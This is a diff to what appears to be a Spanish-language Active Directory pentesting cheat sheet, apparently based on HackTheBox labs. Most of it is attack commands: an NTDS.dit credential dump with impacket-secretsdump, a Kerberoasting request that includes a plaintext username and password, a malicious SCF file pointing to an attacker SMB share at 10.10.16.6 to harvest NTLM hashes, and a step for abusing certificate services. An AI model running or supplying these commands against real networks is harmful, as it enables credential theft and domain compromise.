@@ -62,3 +62,27 @@ robocopy /b z:\windows\ntds . ntds.bak
 impacket-secretsdump -ntds ntds.dit -system system local
 ```
 
+## Kerberoasting Attack
+
+```null
+GetUserSPNs.py search.htb/hope.sharp:'IsolationIsKey?' -request
+```
+
+## SCF Malicioso
+
+```null
+[Shell]
+Command=2
+IconFile=\\10.10.16.6\shared\pwned.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+## Microsoft Active Directory Certificate Services
+
+### Generar certificados
+
+```null
+openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+```
+
